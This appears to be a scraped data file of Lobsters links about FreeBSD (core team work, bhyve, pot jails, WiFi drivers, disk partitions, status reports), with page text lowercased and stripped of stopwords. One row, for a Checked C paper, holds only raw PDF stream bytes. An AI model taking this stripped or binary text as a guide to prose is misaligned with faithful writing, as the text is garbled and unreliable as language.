right model benefit wg structure noted member interviewed move project away socalled culture hero wgs might eliminate need occasional act heroism community depends entirely hero big change leaf unnecessarily exposed risk burnout well tyranny minority recognizing amount work ahead early term behest secretary joseph mingrone ct decided double meeting frequency twice month time size ct backlog high team met weekly admitting significant investment brook davis note higher meeting frequency helped u make lot progress efficiency also helped team bond certainly always agree team collegial could disagree without disagreeable ct working thing like coc collegiality important set tone project encapsulating importance collaboration collegiality warner offer management observation big reason core effective understood needed work together even though held different perspective different priority term working team project mean dealing politics different group goal prevent politics impossible rather goal prevent toxic politics despite tackling highlycharged topic like coc succeeded group able facilitate constructive engagement one another across project management role like freebsd core working volunteer something learn quickly giving ultimatum work instead using power persuasion help shape direction bsdcan status presentation sean chittendon highlighted following example strong collaboration pretty aggressive using google doc content reviewnearly every announcement sent email protected email protected behalf core drafted google doc shared approved core teamslack realtime communication mobile notification coherent history important jumping new community incidentaligned vision among core teamsequencing issue tackling abc month quarter moving xyz aligning meeting w email protected email protected get enough credit role helping email protected regular core report result informed community addition meeting frequently also published detailed frequent note task fall secretary addition secretary play vital role project manager help core stay organized efficient exception secretary joseph mingrone sent detailed report freebsd committers also provided public quarterly report joseph freebsd user since port committer year felt frequent detailed report important remove perception secrecy might diminish trust ct project ct member spoke unanimously hailed effort joseph essential team success counseled future core team recruit secretary joseph commitment member spoke expressed interest exploring way make work ct working group even transparent one option offered potentially open core meeting least part broader audience noted model place similar project like openzfs much meeting possible open portion dealing matter privacy needed closed may worthwhile exploreother member suggested opening working group greater participation among contributor user could beneficial reaching twenty year technology organization remarkable feat especially one considers average lifespan business year enduring technology company whether apple ibm even microsoft radically reinvented many case multiple time stay relevant world around u change researching article emerges clear feeling among freebsd project community stand precipice similar reinvention one look embrace git important example tenacity strong democratic community determined remain relevant year come previousnext
41,Lobsters,freebsd,FreeBSD,Installing Debian Under FreeBSD Bhyve,https://blahg.josefsipek.net/?p=595,installing debian freebsd bhyve,vmbhyve fails boot xfs root file system crc support debian try make multibooting possible,weekend tried move work dev vm slightly beefier vm host meant moving vm kvm omnios bhyve freebsd moving disk image tried configure vmbhyve use asis unfortunately fails boot xfs root file system crc support good way convert disk image get boot via uefi instead avoid completely decided simply reinstall theory difficult since foresight home separate virtual disk practice spent several hour reinstalling debian buster trying figure install reboot fine subsequent boot make past efi firmware turn debian try make multibooting possible put efi binary nonstandard location combined bhyve persisting efi variable shutdown result boot first poweroff even trying look debianspecific path debian bug rather bhyve efi support incomplete easiest way around copy debian binary standard location immediately installation word cd bootefiefi mkdir boot cp needed downside copy get automatically upgraded grub get update completeness relevant bit vm config loader uefi graphic yes cpu memory virtionet public zfszvolopts sparsezvol virtioblk sparsezvol virtioblk
42,Lobsters,freebsd,FreeBSD,Refactoring the FreeBSD Kernel with Checked C,https://cs.rochester.edu/u/jzhou41/papers/freebsd_checkedc.pdf,refactoring freebsd kernel checked c,,obj length filter flatedecode stream xڵ p u e f p 院 c g bⱦ lnmэ c h ѱ endstream endobj obj type objstm n first length filter flatedecode stream e ri r j e j g rkw fm ލ e pq endstream endobj obj length filter flatedecode stream q ͻo hz b l e
43,Lobsters,freebsd,FreeBSD,"Throw-Away Browser on FreeBSD With ""pot"" Within 5 Minutes",https://honeyguide.eu/posts/pot-throwaway-firefox/,throwaway browser freebsd pot within minute,overview orchestrating jail nomad pot setting potpizzamigdev creating jail flavour template creating onetime jail running browser clean use snapshot,overview pot great relatively new jail management tool offer devops style provisioning even used provide dockerlike scalable cloud service together nomad consul orchestrating jail nomad pot using freebsd desktop also use simply easily create throw away browser jail way browser environment reliably completely erased reset time recreate one single simple command please note pot command run root setting pot installing setting potis described detail potpizzamigdev quite straightforward stick sensible default pkg install pot pot init v creating jail flavour template create pot flavour contains detail browser jail usrlocaletcpotflavours flavour contains two simple file directory usrlocaletcpotflavoursbrowser setattribute norcscript v yes setattribute persistent v usrlocaletcpotflavoursbrowsersh binsh w etcpkgfreebsdconf sed squarterlylatest etcpkgfreebsdconf assumealwaysyesyes pkg bootstrap touch etcrcconf sysrc sendmailenable none sysrc sshdenable yes echo myjailpassword pw add user ffoxuser h mkdir homeffoxuser chown ffoxuser homeffoxuser pkg install xauth firefox pkg clean make shell script executable otherwise ignored pot chmod ugox browsersh course could instead firefox also install chromium browser application creating onetime jail running browser simply create jail sudo pot create p onetimebrowser b n publicbridge single f browser watch output creating new pot pot name onetimebrowser type single base potbase level networktype publicbridge ip bridge dns inherit flavour browser fetching freebsd note pot assigns private ip address jail case start browser jail pot start onetimebrowser start firefox jail ssh x ffoxuser firefox necessary replace ip address ip address output copied configuration password asked myjailpassword clean soon done browsing closed browser session stop jail pot stop onetimebrowser delete jail pot destroy p onetimebrowser data associated browsing session completely removed use snapshot lot efficient recreating jail scratch time would taking snapshot immediately creating jail pot snapshot p onetimebrowser instead deleting jail simply roll back finished browsing pot revert p onetimebrowser
44,Lobsters,freebsd,FreeBSD,FreeBSD Journal FAQs – 2020/05-06 – Network Performance,https://www.freebsdfoundation.org/past-issues/network-performance/,freebsd journal faq network performance,table content click start reading,table content click start reading
45,Lobsters,freebsd,FreeBSD,Chai-Fi Makes Adding Public WiFi Networks to wpa_supplicant.conf Easier,https://github.com/gonzoua/chaifi,chaifi make adding public wifi network wpasupplicantconf easier,chaifi description quick start build usage screenshot,chaifi description tool make adding public wifi network wpasupplicantconf easier quick start sudo pkg install go go get githubcomgonzouachaifi sudo gobinchaifi add homegobin path note currently work without sudo make etcwpasupplicantconf editable user build go get go build usage usage chaifi f string path wpasupplicantconf default etcwpasupplicantconf string wireless interface default r restart netif service config changed screenshot
46,Lobsters,freebsd,FreeBSD,FreeBSD Back to Seeing Progress on 802.11ac WiFi Support,https://www.phoronix.com/scan.php?page=news_item&px=FreeBSD-802.11ac-Ath10k-Pro,freebsd back seeing progress wifi support,adrian blog nice accomplishment,longtime freebsdlinux network stack developer former qualcomm atheros engineer adrian chadd back working freebsd wireless networking improvement adrian chadd announced return working freebsd wireless networking stack particular focus support largely lack moment porting driver linux freebsd five year since chadd began driver port freebsd found renewed energy work task freebsd process porting also meant improving freebsd kernel code due largely lacking support moving along well spelled many detail adrian blog interested freebsd wireless networking good news opensource bsd operating system project top nice accomplishment
47,Lobsters,freebsd,FreeBSD,Can You Use FreeBSD for Developer Machine in 2020?,https://www.jeremymorgan.com/blog/freebsd/freebsd-developer-2020/,use freebsd developer machine,freebsd amazing operating system history freebsd giant manual jumping back reading freebsd like developing freebsd setup script gist use freebsd development machine c c python best possible choice frontend web developer overall backend web developer would developer want use freebsd osx linux linux kernel repos freebsd system carefully crafted ecosystem generally freebsd performs better linux many test shown documentation incredible freebsd often one way something port system awesome would use freebsd package available need dockerkubernetes according documentation challenging set get started freebsd virtualbox download freebsd read documentation installing freebsd desktop environment freebsd forum current v release freebsd foundation use freebsd developer machine yes let know,freebsd solid choice server ubiquitous infrastructure world hold desktop machine developer workstation found outi considering moving blog back freebsd web server hosted way year recently switched linux machine could make octopress work properly us old outdated ruby gem seemed easierbut new redesign coming new hugo backend bringing hosting machine back freebsdi recently read freebsd amazing operating system got thinking freebsd viable desktop operating system developer article talk led freebsdhow setting kind developer benefit freebsdwhat get startedlet dig inmy history freebsdi first tried freebsd frustrated linux intrigued using couple year friend suggested freebsd ran portland egghead software bought copyi found pretty frustrating first giant manual reference much google dug one thing noticed right away documentation seemed clear accurate told something followed got expected result hookedi first hosted jeremymorgancom old pentium machine running freebsd sitting garage first real tech job working freebsd dove headfirst learning using daily driver year ran web hosting service freebsd catastrophic failure try let bias review hereeventually started working developer using linux every day match environment home work started drifting away freebsd soon enough using except hosting websitejumping back inso recently reading freebsd researching online installed fired virtual machine quirky error thing changed little year since used desktopi quickly put real hardware machine use running virtual server old ssd lying around threw freebsd stable minimal tinkering involved running might expect older hardware easier set bsd onafter experimenting put brand new laptop hardware work specifically wireless network card ended putting freebsd current iti installed freebsd stable lab machine main work machine used lxde desktop environment old school like itwhat like developing freebsd nowi surprised many thing worked well freebsd set development machine match arch linux machine much possible machine browsingemailnewsweb development frontend backend golang developmentpython developmentcontainers virtualizationwriting article like set freebsd machine thing mostly could away freebsd surprised much stuff available could install single line like example thing installed shared setup script gisthere worked exactly expected v code thankfully nodegorustdockervirtualboxvarious package built sourcehere work available react clisublime text vmware workstationvagrantso able make mirror arch linux environment successful quite bit using two week determined developer use freebsd desktop explain would want towho use freebsd development machine freebsd server world enormous community anyone development maintenance freebsd package use freebsd workstation go without sayingalso c c python developer freebsd probably best possible choice number tool package available true long timebut address audience reader blog need frontend web developersnode seems work well could spin react app modification get react cli work mostly nodegit seems achilles heel installing react cli anything mainstream platformsoperating systemsangular work great playing around sas dependency ran flawlesslyvue cli run great though much push itoverall run significant snag front end thing believe front end developer could use freebsd development machine would similar using linuxbackend web developersthis one tricky since many option choose could get lot thing working well know others used backend without problem freebsd includes golangpythonnodejavasqlitepostgresqlmysqlif work technology right home functional freebsd workstationif net core developer freebsd might way install seems like run linux compatibility ancient version think freebsd diehard excited working microsoft product platform enough work sure possibleso system developer front end backend developer could use freebsd development workstation would want read onwhy would developer want use freebsd reading far likely either using window mac linux development might think change point try let personal bias enter article reason love osx linux could reason love freebsd even explainfreebsd close osx linux stand reason osx originally based bsd unix run parallel linux many year similar however samehere might want run freebsd linux kernel repos freebsd system ok get email linux pretty fragmented freebsd freebsd single source truth documentation package lead next pointit carefully crafted ecosystem walled garden good leadership ecosystem make sure thing get fragmented might upset bleeding edge folk freebsd maintainer strict get added strive cohesiveness showsgenerally freebsd performs better linux expect exponential difference many test shown freebsd performs better linux especially high cpu situationsthe documentation incredible one thing freebsd maintainer take pride documentation stuck many time documentation lead salvationfreebsd often one way something benefit disadvantage often one way thing according designersmaintainers make thing easier say stifle innovation however need software package time either use pkg install build port simple easythe port system awesome afraid compiling source linux different story freebsd need compile something source even whole system painless freebsd spend long time compiling unavoidable nearly many error weird event linuxwhy would use freebsd certain time want use freebsd developerif package available sometimes package available linux emulation great solution reasonable horizon situation freebsd may best choice net core developer instance probably top choiceif need dockerkubernetes according documentation docker broken able get basic container going everything seemed fine seem like docker good place freebsd freebsd user prefer use jail putting much effort docker using docker daily work may red flagit challenging set freebsd user counter saying worth work freebsd difficult frustrating set lot learn may spend lot time tinkering want get running quickly may get started freebsd want try freebsd would suggest downloading virtualbox creating virtual machine put freebsd easiest way try without drastic thing machineyou need download freebsd cpu get virtual machine image make thing little easier need choose release stable explain difference would recommend stable canread documentation installing freebsd thorough help rough spotschoose desktop environment linux user already know install freebsd greeted prompt install kind environment want guibookmark freebsd forum place get help share learned well way enjoying freebsd might find operating system want stick good companycurrent v releaseso freebsd two different version stable current exactly sound like stable version thoroughly tested freebsd contributor considered stable production use supported freebsd foundationcurrent bleeding edge version freebsd contains latest greatest stuff might work also debugging monitoring going mixed bag since option put current laptopmy laptop efi system dual boot window install refit make boot menu entry nothing terrible fun beginner warned use freebsd developer machine answer big question yes ton modern development freebsd advantage fast stable system get configured stay way get real work done come variety tool available assist development foremost freebsd built developmentif end trying freebsd let know love hear feedback using
48,Lobsters,freebsd,FreeBSD,Old School UNIX Disk Partitions,https://bsdimp.blogspot.com/2020/07/old-school-disk-partitioning.html,old school unix disk partition,oldschool disk partition drive evolution partition edition wonder abbreviation edition edition edition,oldschool disk partitionsunix started life many thing invent fly disk handling one item something take utterly granted today upon time area active innovation blog explore early day unix static partitioning compiled drivertypical drive era large difficult manage look good maybe storage evolution partitionsunix earliest day least two type data stored disk first type file system offered hierarchical name space second type swap unix swapping system earliest day multiplex job memory kernel would keep track block assigned processsince disk played two different role different allocation policy persistent storage keep thing simple first edition disk partitioned static way file system used part disk swap used restdec never produce partitioning standard though later used unix unixrelated product mean unix guy nothing draw failed produce standard unix left research editionthere almost nothing resembling partitioning edition kernel unix booted drum device using top block store rest disk reserved swapping process intoout core memory source refer drum block drumthe disk presented device node entire disk edition manual page rk refers entire disk single sequentiallyaddressed file block numbered like rf disk tape file addressing blockorientedwhich describes single file entire block store available edition enigmatic crp filesystem documented one drive wonder abbreviation filesystem usr also show one filesystem per disk drive little bigger floppy disk one filesystem per drive much limitation also note sector size word bytessince limited source time period hard say sure bulk surviving data though say last block reserved unix editionwith edition start see multiple file refer different section disk done new drive supported block exceeded limit time block per device also allows drive broken manageable chunk release different file dev directory named second drive connected would reference drive manual table mirror surviving code disk startlength allows basically two configuration drive split half split small root partition two others partition swap nt one swap space edition configured paramh defines defined device start length device use system would configure early boot side though defines one could nt easily binary patch swap put used part disk tricky get right since map systemyou think drive like case rf driver specified size drive different minor rk driver allowed one experiment different interleaf factor different minor number really drive decide interpret minor number nt unusual various magtape driver used minor number specify density whether rewind editionsthe edition continued evolution changed table number overlapping region need special care used also meant reinstall system hack table driver upgraded used month edition suspect problem nt common edition came site running edition number nt huge since kernel patchable adb front panel switch issue likely could mitigated enough rebuild folk running edition trailblazer definition could expected cope upgrade edition time edition came hundred thousand may explain remained constant edition release rp predefined table became diskstartlength swapping still handled using space partition end filesystem edition way configuring swap improved moving defines variable easily patched adb edition swap still nt need partitionwhat interesting edition introduced raw character device well block device used filesystemthe edition us table edition also introduces disk interface similar hardcoded partition using similar editionthe edition change layout nt mean dec introduced newer larger drive edition also allows larger partition disk address byte instead two driver support multiple drive partition fixed setup different layout device supported well different model example hp driver support drive twice large drive number different layout align size difference used many different drive possible h driver also added well swap drum devicethe problem world new controller appearing third party number disk connect started proliferate problem going get ahead bit edition begat begat series release starting amusingly enough last release time get system different type disk partitioning scheme increasingly difficult manage one special little snowflake depending kind drive attached table xp driver run line author know bad prefix table read pack per drive return part similar problem made palatable creating program diskpart displayed default disk partition specific drive type allowed one create partition table cut paste driver andor config file helped still compiled kernel rather disk pack introduced new wrinkle bad sector information replacement sector conventionally accessible h file system partition disk partition used file system user responsible making sure overlap bad sector information replacement sectorsprogress slow least case every driver table handtweaked drive driver supported ok far went industry shifted away controller disk combo choice standard interface drive host functionality drive became untenable situationwe explore got worse got better second part see different vendor innovated area ahead solution appeared tahoe system around time edited correct typo
49,Lobsters,freebsd,FreeBSD,I'm back into the grind of FreeBSD's wireless stack and 802.11ac,https://adrianchadd.blogspot.com/2020/07/im-back-into-grind-of-freebsds-wireless.html,back grind freebsd wireless stack,work ampdu amsdu deencapsulation uapsd support migrating option pervap state change locking issue encryption key programming next add channel entry regdomainxml add mumimo group notification block traffic transmitted node creation key update clean linuxy bit wrap,hi yes since posted yes since actively working freebsd wireless stack life well life started port nt expecting take year life changed quite lot since lot thing stopped fun star aligned fun thing right first ifrun ralink mediatek usb driver stuff made mediatek acquired contributor named ashish gupta showed freebsdwifi irc channel efnet start working support ifrun got point basic worked took ran enough land support turn couple suitable nics test well happened super happy ashish came along get working another nic ifrun todo list anyone welcome contribute ashish looking wide channel support right short longgi support would good need get tx aggregation working via firmware interface look like linux driver bit need nt need retransmission support firmware set descriptor correctly work next basic bit even people think nt know mumimo stream yet basic ap sta driver regulatory domain support however implement port find missing bit really need ampdu amsdu deencapsulation hardware ampdu amsdu deencapsulation hardwarefirmware pushing individual decrypted deencapsulated frame driver support native wifi ethernet encapsulation right support native wifi note support well try get going driver land added support handle decryption offload supplied ampduamsdu frame pnmic done firmwarehardware could get traffic however receive throughput plainly sucked last poked also added amsdu offload support would nt drop amsdu frame receive sequence number however turn mac amsdu ampdu receive ampdu reordering faithfully dropping amsdu frame receive sequence number tcp would see massive packet loss drop throughput huge way implementing feature requires buffering amsdu frame ampdu subframe reordering queue rather tossing reordering single frame modified receive reordering logic reorder queue mbufs instead mbufs patched thing allow queuing multiple mbufs long appropriately stamped amsdus single ampdu subframe receive traffic rate udptcp phew uapsd support nt want implement full uapsd support atheros driver requires lot driver work get right actual uapsd negotiation support significantly easier nic support uapsd offload like populate wme qos field appropriately call driver notify uapsd change right nt support addts delts method client requesting explicit qos requirement migrating option pervap state bunch state still global rather pervap make sense old world nics thing driver side driven software firmware thing like current channel shortlong preamble etc global state however later nics offload various thing firmware begin interesting thing like background channel switching scan background channel switching sta lot state kept pervap rather globally right flag y set given vap started migrating state pervap field rather global showed second shortcoming global nt explicitly tracking thing perchannel ok need bit explanation say channel need determine whether care client seeing servicing client using short slot time short preamble require rtscts protection interoperate client client show client nt need interoperate nt need rtscts use short preamble short slot time still client need interoperate need switch protection mode legacy rtscts protection client show point protection kick everyone rtscts protection long preambleslot time kick property vap channel technically speaking property channel vap channel see client vaps need transition update protection mode migrated pervap kept global state literally driver currently consume driver us pervap state greatly simplifying thing finishing todo item driver change yes hacking locking issue bunch feedback pull request bjorn geramy pointing lock ordering deadlock issue slowly working straight conversion linux freebsd showed difference locking howwhen driver thread run rant another day encryption key programming encryption key programming programmed using firmware call currently expects done synchronously ca nt sleep crypto key update without changing lock sx lock honestly think bad solution paper nonasynchronous code honestly made asynchronous anyway node update done using deferred call required take complete copy encryption key content turn pretty quickly recycle key content including key hiding inside fixed key reprogramming deletion sometimes sending garbage firmware whoop next next well want land driver still whole bunch thing driver add channel entry regdomainxml yes added fcc nt add regulatory domain code lot work file implemented love help add mumimo group notification like make sure least support associating mumimo ap think firmware need support ie notification block traffic transmitted node creation key update right transmit frame right adding node sending key update assumes driver completing returning software driven nics like atheros chip hold true everything usb newer firmware based device definitely nt hold particular try transmitting frame without node firmware whole transmit path hang whoop fixed ca nt queue frame firmware nt know node send association response hostap mode node created mean first association response nt make associating client since nt yet traffic buffering buffer frame key update node additiondeletion make sure nothing sent dropped clean linuxy bit bunch dead code nt need nt use well compatibility bit define linux bit live going turn method remove linuxy bit bjorn work make linuxkpi wifi shim translate call api bit add rather roll full wifi method inside linuxkpi wrap job change relationship change kid getting green card buying house paying old debt old hosting company throw spanner life machine plus side hacking freebsd wifi support fun actually able sleep night go
50,Lobsters,freebsd,FreeBSD,Utility to determine if ELF binary is built with debug sections,https://github.com/sbz/elfdbg,utility determine elf binary built debug section,elfdbg debug section elf elf usage build install test kyua kyuafile history,elfdbg project elfdbg utility program quickly identify elf binary built debug section debug section elf binary usually generated using g flag compiler compiler add new debug section binary program looking existence section name starting debug determine binary built debug information elf format wellknown standard elf ti reference specification available freebsd elf man page usage intented used shell script order avoid using file parsing output like file pathtobinary awk debuginfo print elf determine binary built debug use following elfdbg q pathtobinary echo symbol else echo binary debug symbol fi freebsd easily identify binary package missing debug using similar oneliner pkg info lgrep localbinwhile read echo elfdbg done build install makefile use standard bsd makefile build program make sudo make install linux use make f gnumakefile specify gnu makefile test test case implemented using freebsd test suite framework kyua kyuafile make test history wrote using libelf elf gelf api rewrote without relying libelf api
51,Lobsters,freebsd,FreeBSD,FreeBSD 2020Q2 Status Report,https://www.freebsd.org/news/status/report-2020-04-2020-06.html,freebsd status report,introduction administration page deb freebsdfoundationorg impact foundation partnership commercial user support fundraising effort donation help u continue increase support freebsd partnership program o improvement university waterloo coop continuous integration quality assurance supporting freebsd infrastructure freebsd advocacy education year freebsd get involved announcement project youtube channel bimonthly newsletter contributor case study access latest issue event attended upcoming event foundation board meeting freebsd foundation board director legalfreebsd ip freebsd foundation web site core freebsdorg beta version freebsdorg clusteradm freebsdorg beta git server generic mirrored layout tiny mirror jenkinsadmin freebsdorg lwhsu freebsdorg freebsdtesting mailing list weekly ci report artifact server devci mailing list freebsdci repo portmgrsecretary freebsdorg portmgr freebsdorg allanjude freebsdorg quarterly frebsdorg debdrup freebsdorg subscribe bsdic microsoftcom whu freebsdorg lwhsu freebsdorg image azure marketplace emaste freebsdorg imp freebsdorg uqs freebsdorg freebsdgit mailing list git conversion tooling repo emaste freebsdorg kevans freebsdorg freqlabs freebsdorg trasz freebsdorg linux app status wiki page freebsd continuous integration infrastructure rmacklem freebsdorg gonzo freebsdorg chuck freebsdorg marc bumblingdorkcom manu freebsdorg manu freebsdorg mk semihalfcom ar semihalfcom mw semihalfcom chs freebsdorg mckusick mckusickcom gonzo freebsdorg bz freebsdorg kib freebsdorg kib freebsdorg mw semihalfcom ar semihalfcom dgr semihalfcom nxp soc kib freebsdorg melifaro freebsdorg background implementation overview talk status allanjude freebsdorg arichardson freebsdorg andrew freebsdorg brook freebsdorg trasz freebsdorg freebsdorg jhb freebsdorg rwatson freebsdorg br freebsdorg fett cheri cc programming guide trasz freebsdorg freebsd ci infrastructure mhorne freebsdorg freebsdriscv mailing list riscv instruction set architecture uboot se freebsdorg yzenatech gmailcom emaste freebsdorg todo kib freebsdorg gonzo freebsdorg christeredwards gmailcom status kde freebsdorg kdevelop kontact haskell freebsdorg freebsdportshaskell hlh restartbe sysutilsrtsxkmod paulf freefr kevans freebsdorg dbaio freebsdorg ebrandi freebsdorg status language dan langilleorg git back september created script help wanted package dependency line watch port maintain search page report subscription repology link reading thing know freshports javascript help wanted recently upgraded anatoliws callum aitchisonorg grehan freebsdorg thierry freebsdorg gonzo freebsdorg alfonsosiciliano emailcom sl honeyguideeu also support orchestration nomad potluck repository complete jitsi meet instance jail news home status home,introductionthis report covering freebsd related project april june cover diverse set topic ranging kernel update userland port well thirdparty work highlight picked roll include limited ability forcibly unmount ufs underlying medium becomes inaccessible added preliminary support bluetooth low energy introduction freebsd office hour repository software collection called potluck installed pot utility well many many thing little treat reader also get rare report quarterly team finally behalf quarterly team would like extend deepest appreciation thank salvadore decided take shingle contribution quarterly report also surrounding tooling manyfold ease work immeasurable hope find report interesting daniel ebdrup jensen debdrup behalf quarterly team entry various official semiofficial team found administration page contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure provides resource improve security quality assurance release engineering effort publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter impact foundation like organization put policy place staff member work home also put temporary ban travel staff member continuing work supporting community project work response may delayed change priority impact limited childcare staff member partnership commercial user support help facilitate collaboration commercial user freebsd developer also meet company discus need bring information back project surprisingly stay home order combined company ban travel made inperson meeting nonexistent however team able continue meeting partner commercial user virtually meeting help u understand application freebsd used fundraising effort last quarter raised thank individual organization stepped help fund effort like thank netflix employee nginx beckhoff automation mozilla foundation large contribution last quarter helped bring fundraising effort hope organization follow lead give back help u continue supporting freebsd trying time deeply appreciate every donation come still giving supporting freebsd funded donation fund go towards software development work improve freebsd freebsd advocacy around world keeping freebsd secure continuous integration improvement sponsoring bsdrelated computing conference even virtual event legal support project many area please consider making donation help u continue increase support freebsd also partnership program provide benefit larger commercial donor find information partnership program share company o improvement number freebsd foundation grant recipient started continued working completed project second quarter include wifi improvement linuxulator application compatibility drm graphic driver update zstd compression openzfs online raidz expansion ifbridge performance improvement find detail project quarterly report staff member also worked number larger project including runtime dynamic linker rtld improvement improved freebsd support microsoft hyperv azure finegrained locking pmap paging structure nontransparent superpages migration git repository tool chain modernization many project also detailed entry quarterly report entry staff member also put significant effort many way larger individual project include assisting code review bug report triage security report triage advisory handling addressing syzkaller report ongoing maintenance bug fix functional area tool chain developer tool virtual memory kernel subsystem lowlevel infrastructure socket protocol others university waterloo coop foundation coop student colin tiger yang completed winter work term second quarter continued next school term respective program although presented unique challenge prompted abrupt transition remote work half way term three learned lot provided positive contribution freebsd project foundation project progress completed work term committed freebsd tree second quarter continuous integration quality assurance foundation provides fulltime staff member working improving continuous integration automated testing overall quality assurance effort freebsd project second quarter foundation staff continued improving project ci infrastructure monitoring regression working contributor fix failing build test case setting vm host ci job staging environment progress also working team project testing need example added job running full test architecture also working many external project company improve support freebsd see freebsd ci section report completed work item detailed information supporting freebsd infrastructure foundation provides hardware support improve freebsd infrastructure last quarter continued supporting freebsd hardware located around world started working getting new nyi chicago colocation facility prepared new freebsd hardware planning purchasing nyi generously provides free project freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project case u industry put inperson event hold addition attending virtual event continually working new training initiative updating selection howto guide facilitate getting folk try freebsd check advocacy education work last quarter silver sponsor bsdcan event held virtually june community sponsor rootconf event held virtually june annual freebsd day june year celebration postponed support juneteeth however activity surrounding freebsd day transformed ongoing series online session see freebsd friday information presented year freebsd get involved part linux professional institute series webinars june attended presented virtual open source summit announced freebsd friday series class designed get started freebsd find announcement participated admin google summer code participated new freebsd office hour series including holding foundation led office hour video one hour session found project youtube channel watch addition information found development project update section report take minute check latest update blog keep date latest work bimonthly newsletter mellanox provided update use freebsd latest contributor case study help educate world freebsd publishing professionally produced freebsd journal mentioned previously freebsd journal free publication find access latest issue journal site find event attended upcoming event continued work new website developer help u improve website work nearly complete make easier community member find information easily make site efficient look forward unveiling refreshed site foundation board meeting annual board meeting held tuesday june normally hold meeting tuesday bsdcan ottawa ontario canada company travel ban conference going virtual meeting went virtual first time purpose annual board meeting hold board director officer election review work accomplished past year put together strategic goal upcoming month board generally two allday board meeting year one informal one january typically held berkeley meeting allow u connect reevaluate discus new idea assessing help project longerterm goal include growing user developer community developing training o course content improving desktoplaptop experience promoting freebsd see advocacy work listed improving testing capability result director officer election justin gibbs president benedict reuschling vice president kirk mckusick treasurer philip paeps secretary deb goodkin assistant secretary robert watson director hiroki sato director george nevilleneil director find freebsd foundation board director website legalfreebsd ip foundation owns freebsd trademark responsibility protect also provide legal support core team investigate question arise go freebsd foundation web site find support freebsd help contact freebsd core team core freebsdorg freebsd core team governing body freebsd core team held meeting second quarter including joint meeting member freebsd foundation highlight meeting deb requested guidance foundation support community core foundation member believe developer support necessary fill gap area commercial customer provide backing clearest example gap desktop experience including graphic wireless support make request different past request rather support onetime project ongoing position necessary consistently highquality desktop experience freebsd able run laptop first step irrelevance ed maste team discussed topic upcoming session freebsd office hour informal freebsd video conference anyone attend everyone agreed office hour useful way different part project engage wider community kudos allan jude initiating office hour everyone helped make success hosting attending session team agreed meet per quarter second annual community survey closed purpose survey collect data public help guide project effort priority example last year survey result helped initiate project conversion git thank took time respond result released soon coreinitiated git working group continued make progress still remaining issue worked translation subversion hopefully new git src repository ready use summer beta version published people test preliminary version using git freebsd development primer soon ready share core git working group release engineering working towards goal releasing new git repository following result coreinitiated developer survey freebsd project adopted new llvmderived code conduct http wwwfreebsdorginternalcodeofconducthtml eleventh freebsd core team elected active developer pool successful candidate sean chittenden seanc incumbent baptiste daroussin bapt kyle evans kevans mark johnston markj scott long scottl warner losh imp incumbent ed maste emaste george v nevilleneil gnn hiroki sato hr incumbent new core team secretary muhammad moinur rahman bofh unanimously approved outgoing core team met three time new core team help transition wish successful term contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code slush maintaining respective branch among thing second quarter release engineering team started work cycle fifth release branch release cycle went quite smoothly removed schedule allowed final release occur one week earlier originally scheduled announced june freebsd expected final release freebsd release engineering team would like thank everyone involved cycle hard work additionally throughout quarter several development snapshot build released head branch much work sponsored rubicon communication llc netgatecom freebsd foundation contact cluster administration team clusteradm freebsdorg freebsd cluster administration team consists people responsible administering machine project relies distributed work communication synchronised quarter team worked following upgrade ref universemachines setup amsterdam pkt mirror solve hardware issue bugzilla svnweb backend setup public beta git server decommission cyberone data cyb mirror ongoing system administration work account management committers backup critical infrastructure keeping security update party software work progress setup malaysia kul mirror setup brazil bra mirror review service jail service administrator operation infrastructure building package nvme issue blocking dual socket machine used pkg builder drive upgrade test pkg builder ssds courtesy freebsd foundation boot issue reference machine new nyinet sponsored colocation space chicagoland area work git working group check new hardware requirement team searching provider fit requirement generic mirrored layout tiny mirror contact jenkins admin jenkinsadmin freebsdorg contact liwen hsu lwhsu freebsdorg contact freebsdtesting mailing list contact irc freebsdci channel efnet freebsd ci team maintains continuous integration system freebsd project ci system firstly check committed change successfully built performs various test analysis newly built result artifact build job archived artifact server testing debugging need ci team member examine failing build unstable test work expert area fix code adjust test infrastructure detail effort available weekly ci report second quarter continue working contributor developer project testing need also keep working external project company improve support freebsd important change test job run test usrtests previously architecture see continuous integration section report information compression algorithm disk image artifact server changed zstd speed compression decompression build test result sent devci mailing list soon feedback help analysis appreciated new job added http http http http work progress collecting sorting ci task idea testing merging pull request freebsdci repo setting builder dedicated run job using provisioned vms setting ci stage environment putting experimental job implementing automatic test bare metal hardware adding drm port building test current planning run ztest network stack test adding external toolchain related job improving hardware lab mature adding hardware helping software get ci freebsd hosted ci solution working hosted ci provider better freebsd support please see freebsdtesting related ticket wip information nt hesitate join effort sponsor freebsd foundation contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg port management team responsible overseeing overall direction port tree building package personnel matter happened last quarter currently open port pr unassigned total port last quarter commits head quarterly branch respectively committers compared quarter mean significant increase commits also slight decrease open pr last quarter welcomed hiroki tagato tagattie said goodbye seanc zleslie gnn salvadore default version got bumped java new lazarus possible write pkg script lua instead sh two advantage sh version run capsicum sandbox respect rootdir directory pkg use starting point install package userfacing package also updated pkg firefox thunderbird chromium ruby last quarter antoine ran expruns test port version update make liblzma use libmd flavor develscons lua port add update library function base system make malloch usable remove base system augment sed f contact allan jude allanjude freebsdorg starting first april freebsd project started hosting regular video stream foster greater communication within wider freebsd community first session took form public question answer session drew participant second session held two week later time appropriate asia drew participant help freebsd foundation ran poll discover time worked best greatest number people may freebsd foundation hosted session community could ask question foundation may many candidate new freebsd core team joined office hour session answer question community finally june another general question answer office hour held office hour session consists video meeting freebsd developer subject matter expert live streamed along irc chat room viewer pose question panel stream recorded posted official freebsd youtube channel would like host office hour 